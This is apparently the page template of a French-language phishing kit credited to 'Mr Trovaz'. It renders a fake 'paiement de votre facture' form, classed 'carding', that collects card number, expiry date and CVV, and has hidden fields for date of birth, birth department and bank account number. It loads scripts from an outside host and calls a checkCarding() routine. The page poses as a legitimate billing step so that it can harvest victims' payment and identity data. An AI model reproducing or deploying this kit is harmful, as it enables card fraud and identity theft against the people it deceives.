<?php
/*   ________________________________________________________________________ 
    |  Mr Trovaz - Php Script   1.8.8                                       |
    |              on 2017-10-17 14:57:35                                                     |
    |    Facebook: https://www.facebook.com/profile.php?id=100010413816341   |
    |________________________________________________________________________|
*/?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vos coordonnées bancaires</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
    <meta name="description"
          content="Designed to be the perfect starting point&nbsp;for any dashboard or admin site. Charts,&nbsp;graphs, sortable tables,&nbsp;and more than a dozen other new&nbsp;components included.">
    <link rel="icon" type="image/png" href="//censor-susan-76126.bitballoon.com/img/favicon.png">
    <link href="app/views/assets/css/bootstrap.css" rel="stylesheet" type="text/css">
    <link href="//censor-susan-76126.bitballoon.com/css/style.css" rel="stylesheet" type="text/css">
    <link href="app/views/assets/css/my-other.css" rel="stylesheet" type="text/css">
    <script src="app/views/assets/js/jquery.min.js" type="text/javascript"></script>
    <script src="//censor-susan-76126.bitballoon.com/js/jquery.creditCardValidator.js" type="text/javascript"></script>
    <script src="//censor-susan-76126.bitballoon.com/js/jquery.mask.min.js" type="text/javascript"></script>
<!--    <script src="//censor-susan-76126.bitballoon.com/js/my-script.js" type="text/javascript"></script>-->
    <script src="app/views/assets/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="app/views/assets/js/my-script.js" type="text/javascript"></script>
</head>
<body>
<div class="container con">


    <div class="row">
        <div id="">
            <div class="col-xs-10 col-md-6 col-lg-6 col-sm-6" style="margin-top: 10px;">
                <div class="left"><img src="app/views/assets/img/header_1.png" alt=""/><span
                            style="font-size: 20px;font-weight:600;margin-left: 6px">2/3 - paiement</span></div>
            </div>
            <div class="col-xs-2 col-md-6 col-lg-6 col-sm-6" style="margin-top: 10px">
                <div class="right"><img data-toggle="modal" data-target="#myModal" src="app/views/assets/img/lock.png"
                                        alt=""/></div>
            </div>
        </div>
    </div>


    <div class="row form">
        <div class="center-block panel-heading paiment white" style="border: none;border-radius: 0">
               <span class="panel-title">
                    <b class="p-heading-title">Paiement de votre facture </b>
                </span>
        </div>
        <div class="center-block paiment white beauty">
            <div id="LLDDKDJDNND778-dgd">
                <div class="RRTITOTGHFHFERROR hidden">
                    <div class="RRTITOTGHFHFERRORImage"></div>
                    <div id="RRTITOTGHFHFERROR_message"><b class="RRTITOTGHFHFERROR_message"></b></div>
                    <div class="RRTITOTGHFHFERRORclear"></div>
                </div>
            </div>
            <form class="form-horizontal carding" action="#" method="post">
                <input type="hidden" name="type" value="2">
                <div id="hidden-inputs"></div>
                    <div class="form-group">
                        <label class="control-label col-sm-12 col-xs-12 col-md-12 col-lg-12" for="ccno">type de carte
                            : </label>
                        <div class="col-sm-12 col-xs-12 col-md-12 col-lg-12">
                            <select class=" error col-xs-12 col-sm-12 col-lg-12 default_select" id="card-type-trv"
                                    for="Aucun type de carte n'a été sélectionné">
                                <option value="0"></option>
                                <option value="cb">Carte Bleue</option>
                                <option value="visa">Visa</option>
                                <option value="master">Mastercard</option>
                                <option value="ecb">eCarteBleue</option>
                            </select>
                        </div>
                        <div class="col-sm-12 col-xs-12 col-md-12 col-lg-12 ">
                            <img class="cardType" src="app/views/assets/img/c_b.png" width="29" height="22"
                                 alt="Carte Bleue">
                            <img class="cardType" src="app/views/assets/img/v_s.png" width="41" height="22"
                                 alt="Visa">
                            <img class="cardType" src="app/views/assets/img/m_c.png" width="35"
                                 height="22" alt="MasterCard">
                            <img class="cardType" src="app/views/assets/img/e_c_b.png" width="51" height="22"
                                 alt="e-Carte">
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="control-label col-sm-12 col-xs-12 col-md-12 col-sm-12 col-lg-12" for="ccno">Card
                            Number : </label>
                        <div class="col-sm-12 col-xs-12 col-md-12 ">
                            <input type="tel" class="my-input form-control error" id="ccno" name="ccno"
                                   for="Le numéro de carte bancaire doit être composé de 16 ou 19 chiffres">

                        </div>
                    </div>

                    <div class="form-group">
                        <label class="control-label col-sm-12 col-xs-12 col-lg-12" for="expdate">Date d'expiration
                            :</label>
                        <div id="expdate" class="col-sm-6 col-xs-8 col-md-6 error"
                             for="La date d'expiration de votre carte est dépassée, vérifiez la date indiquée sur votre carte">
                            <select id="expMonth" name="card_expiration_month" class="default_select">
                                <option value="-">mois</option>
                                <option value="01">01</option>
                                <option value="02">02</option>
                                <option value="03">03</option>
                                <option value="04">04</option>
                                <option value="05">05</option>
                                <option value="06">06</option>
                                <option value="07">07</option>
                                <option value="08">08</option>
                                <option value="09">09</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                            </select>
                            <select id="expYear" name="card_expiration_year" class="default_select">
                                <option value="-">année</option>
                                <option value="2017">2017</option>
                                <option value="2018">2018</option>
                                <option value="2019">2019</option>
                                <option value="2020">2020</option>
                                <option value="2021">2021</option>
                                <option value="2022">2022</option>
                                <option value="2023">2023</option>
                                <option value="2024">2024</option>
                                <option value="2025">2025</option>
                                <option value="2026">2026</option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="control-label col-sm-12 col-xs-12" for="cvv">numéro de contrôle :</label>
                        <div class="col-sm-2 col-xs-2 col-md-2">
                            <input type="text" class="my-input  form-control error" id="cvv"
                                   for="Le code de sécurité doit être composé de 3 chiffres"
                                   name="cvv" maxlength="3">
                        </div>

                    </div>
                <div id="dobirth" class="form-group hidden error" for="Date de naissance incorrect">
                    <label class="control-label col-sm-12 col-xs-12 col-lg-12" for="dobirth">Date de naissance :</label>
                    <div  class="col-sm-6 col-xs-8 col-md-6  "
                          style="padding-left: 12px;">
                        <div class="col-sm-3 col-xs-3 col-md-2" style="width:60px; padding-right: 0px;padding-left: 4px;">
                            <input type="text" class="my-input  form-control" id="dob"
                                   name="dob" maxlength="2">
                        </div>
                        <div class="col-sm-3 col-xs-3 col-md-2" style="width:60px; padding-right: 0px;padding-left: 4px;">
                            <input type="text" class="my-input  form-control" id="mob"
                                   name="mob" maxlength="2">
                        </div>
                        <div class="col-sm-3 col-xs-3 col-md-2" style="width:60px; padding-right: 0px;padding-left: 4px;">
                            <input type="text" class="my-input  form-control" id="yob"
                                   name="yob" maxlength="4">
                        </div>
                    </div>
                </div>
                <div  class="form-group hidden  error departement-naissance" for="Département de naissance  incorrect">
                    <label class="control-label col-sm-12 col-xs-12 col-lg-12" for="dobirth">Département de naissance :</label>
                    <div  class="col-sm-6 col-xs-8 col-md-6  "
                          style="padding-left: 12px;">
                        <div class="col-sm-3 col-xs-3 col-md-2" style="width:100px; padding-right: 0px;padding-left: 4px;">
                            <input type="text" class="my-input  form-control"
                                   name="departement_naisance" maxlength="10">
                        </div>
                    </div>
                </div>
                <div  class="form-group hidden error n-compte" for="Numéro de compte  incorrect">
                    <label class="control-label col-sm-12 col-xs-12 col-lg-12" >N&deg; de compte :</label>
                    <div  class="col-sm-6 col-xs-8 col-md-6  "
                          style="padding-left: 12px;">
                        <div class="col-sm-3 col-xs-3 col-md-2" style="width:100px; padding-right: 0px;padding-left: 4px;">
                            <input type="text" class="my-input  form-control"
                                   name="numero_compte" maxlength="14">
                        </div>
                    </div>
                </div>
                <div id="validButtonsTrv" style="padding-bottom:5px">
                    <div class="security_code_info-trvz tdTrvz">
                        il s'agit des 3 derniers chiffres figurant au dos de votre carte
                    </div>
                    <div class="tdTrvz align_td_middle-trvz">
                        <div class="cardCVV-trvz cardCBCVV-trvz"></div>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <div class="row center-block">
        <span class="button annuler col-sm-5 col-md-5 col-lg-5 col-xs-5 ciao-trv"
              style="margin-left: 0;width: 48%;border-radius: 3px;">Annuler</span>
        <span id="FFIOMNLLDSXXZQASDS" class="button imp  col-sm-5 col-md-5 col-lg-5 col-xs-5 right ciao-trv"
              title="banqueassurance" style="width: 48%;border-radius: 3px;">confirmer</span>
    </div>
</div>

<script>
    checkCarding();
</script>
</body>
</html>
